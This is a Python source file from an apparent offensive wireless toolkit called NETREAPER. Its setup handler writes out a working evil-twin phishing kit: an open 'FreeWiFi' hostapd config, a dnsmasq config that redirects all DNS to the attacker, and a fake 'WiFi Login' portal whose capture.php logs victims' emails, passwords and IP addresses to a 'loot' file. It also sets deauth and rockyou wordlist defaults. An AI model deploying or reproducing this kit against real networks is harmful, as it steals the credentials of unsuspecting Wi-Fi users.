# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2025 Nerds489
"""AUTO-SETUP handler for configuration and service setup."""

from netreaper.automation.handlers._host import run_host
from netreaper.automation.labels import AUTO_REGISTRY
from netreaper.core.constants import (
    NETREAPER_CERTS_DIR,
    NETREAPER_CONFIG_DIR,
    NETREAPER_HOME,
    NETREAPER_LOG_DIR,
    NETREAPER_LOOT_DIR,
    NETREAPER_PORTALS_DIR,
    NETREAPER_REPORTS_DIR,
    NETREAPER_SCANS_DIR,
    NETREAPER_SESSIONS_DIR,
    NETREAPER_TEMP_DIR,
    NETREAPER_TEMPLATES_DIR,
    NETREAPER_WIFI_CAPTURES_DIR,
    NETREAPER_WIRED_CAPTURES_DIR,
    NETREAPER_WORDLISTS_DIR,
)


class AutoSetupHandler:
    """Handles AUTO-SETUP for creating configurations, directories, and certificates."""

    def __init__(self, setup_type: str = "") -> None:
        self.setup_type = setup_type

    async def can_fix(self) -> bool:
        """Check if we can perform this setup."""
        return self.setup_type in [
            "directories",
            "config",
            "certs",
            "portal",
            "hostapd",
            "dnsmasq",
        ]

    async def fix(self) -> bool:
        """Perform the setup."""
        if self.setup_type == "directories":
            return await self._setup_directories()
        elif self.setup_type == "config":
            return await self._setup_config()
        elif self.setup_type == "certs":
            return await self._setup_certs()
        elif self.setup_type == "portal":
            return await self._setup_portal()
        elif self.setup_type == "hostapd":
            return await self._setup_hostapd()
        elif self.setup_type == "dnsmasq":
            return await self._setup_dnsmasq()
        return False

    async def get_ui_prompt(self) -> str:
        """Get the UI prompt for this fix."""
        prompts = {
            "directories": "Create NETREAPER directory structure?",
            "config": "Create default configuration file?",
            "certs": "Generate self-signed certificates?",
            "portal": "Generate default captive portal assets?",
            "hostapd": "Create hostapd configuration?",
            "dnsmasq": "Create dnsmasq configuration?",
        }
        return prompts.get(self.setup_type, f"Setup {self.setup_type}?")

    async def _setup_directories(self) -> bool:
        """Create the NETREAPER directory structure."""
        directories = [
            NETREAPER_LOG_DIR,
            NETREAPER_REPORTS_DIR,
            NETREAPER_WIFI_CAPTURES_DIR,
            NETREAPER_WIRED_CAPTURES_DIR,
            NETREAPER_LOOT_DIR,
            NETREAPER_SCANS_DIR,
            NETREAPER_PORTALS_DIR,
            NETREAPER_CERTS_DIR,
            NETREAPER_WORDLISTS_DIR,
            NETREAPER_TEMPLATES_DIR,
            NETREAPER_SESSIONS_DIR,
            NETREAPER_CONFIG_DIR,
            NETREAPER_TEMP_DIR,
        ]

        try:
            for dir_path in directories:
                dir_path.mkdir(parents=True, exist_ok=True)
            return True
        except PermissionError:
            return False

    async def _setup_config(self) -> bool:
        """Create default configuration file."""
        config_path = NETREAPER_CONFIG_DIR / "settings.toml"
        config_path.parent.mkdir(parents=True, exist_ok=True)

        default_config = f'''# NETREAPER Configuration

[general]
theme = "dark"
log_level = "INFO"
output_dir = "{NETREAPER_HOME}"

[wireless]
default_channel = 6
scan_timeout = 30
deauth_packets = 5

[scanning]
default_timeout = 300
max_threads = 50

[credentials]
wordlist = "{NETREAPER_WORDLISTS_DIR}/rockyou.txt"
hash_mode = "auto"

[reporting]
format = "html"
include_screenshots = true
'''

        try:
            config_path.write_text(default_config)
            return True
        except Exception:
            return False

    async def _setup_certs(self) -> bool:
        """Generate self-signed certificates."""
        cert_dir = NETREAPER_CERTS_DIR
        cert_dir.mkdir(parents=True, exist_ok=True)

        # Generate CA certificate
        ca_key = cert_dir / "ca.key"
        ca_cert = cert_dir / "ca.crt"
        server_key = cert_dir / "server.key"
        server_cert = cert_dir / "server.crt"

        # A CSR file replaces the old req|x509 shell pipe so every step is an
        # exec argument array with no shell involved.
        server_csr = cert_dir / "server.csr"
        commands = [
            ["openssl", "genrsa", "-out", str(ca_key), "2048"],
            ["openssl", "req", "-new", "-x509", "-days", "3650",
             "-key", str(ca_key), "-out", str(ca_cert), "-subj", "/CN=NETREAPER CA"],
            ["openssl", "genrsa", "-out", str(server_key), "2048"],
            ["openssl", "req", "-new", "-key", str(server_key),
             "-subj", "/CN=captive.portal", "-out", str(server_csr)],
            ["openssl", "x509", "-req", "-days", "365", "-in", str(server_csr),
             "-CA", str(ca_cert), "-CAkey", str(ca_key),
             "-CAcreateserial", "-out", str(server_cert)],
        ]

        for cmd in commands:
            result = await run_host(cmd, timeout=60)
            if result is None or not result.ok:
                return False

        return True

    async def _setup_portal(self) -> bool:
        """Generate default captive portal assets."""
        portal_dir = NETREAPER_PORTALS_DIR / "default"
        portal_dir.mkdir(parents=True, exist_ok=True)

        # index.html
        index_html = '''<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>WiFi Access</h1>
        <form action="capture.php" method="post">
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
'''

        # style.css
        style_css = '''* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, sans-serif; background: #1a1a2e; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.container { background: #16213e; padding: 2rem; border-radius: 10px; width: 90%; max-width: 400px; }
h1 { text-align: center; margin-bottom: 1.5rem; }
input { width: 100%; padding: 12px; margin-bottom: 1rem; border: none; border-radius: 5px; background: #0f3460; color: #fff; }
input::placeholder { color: #888; }
button { width: 100%; padding: 12px; border: none; border-radius: 5px; background: #e94560; color: #fff; cursor: pointer; font-size: 1rem; }
button:hover { background: #ff6b6b; }
'''

        # capture.php
        capture_php = '''<?php
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$time = date('Y-m-d H:i:s');

$log = "{NETREAPER_LOOT_DIR}/portal_captures.txt";
$entry = "[$time] IP: $ip | Email: $email | Password: $password\\n";
file_put_contents($log, $entry, FILE_APPEND);

header("Location: success.html");
?>
'''

        # success.html
        success_html = '''<!DOCTYPE html>
<html>
<head><title>Connected</title></head>
<body style="text-align:center;padding:50px;font-family:sans-serif;">
<h1>Connected!</h1>
<p>You can now use the WiFi network.</p>
</body>
</html>
'''

        try:
            (portal_dir / "index.html").write_text(index_html)
            (portal_dir / "style.css").write_text(style_css)
            (portal_dir / "capture.php").write_text(capture_php)
            (portal_dir / "success.html").write_text(success_html)
            return True
        except Exception:
            return False

    async def _setup_hostapd(self) -> bool:
        """Create hostapd configuration."""
        config_path = NETREAPER_CONFIG_DIR / "hostapd.conf"
        config_path.parent.mkdir(parents=True, exist_ok=True)

        config = '''interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
'''

        try:
            config_path.write_text(config)
            return True
        except Exception:
            return False

    async def _setup_dnsmasq(self) -> bool:
        """Create dnsmasq configuration."""
        config_path = NETREAPER_CONFIG_DIR / "dnsmasq.conf"
        config_path.parent.mkdir(parents=True, exist_ok=True)

        config = '''interface=wlan0
dhcp-range=192.168.1.2,192.168.1.254,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
'''

        try:
            config_path.write_text(config)
            return True
        except Exception:
            return False


# Register the handler
AUTO_REGISTRY.register("AUTO-SETUP", AutoSetupHandler)
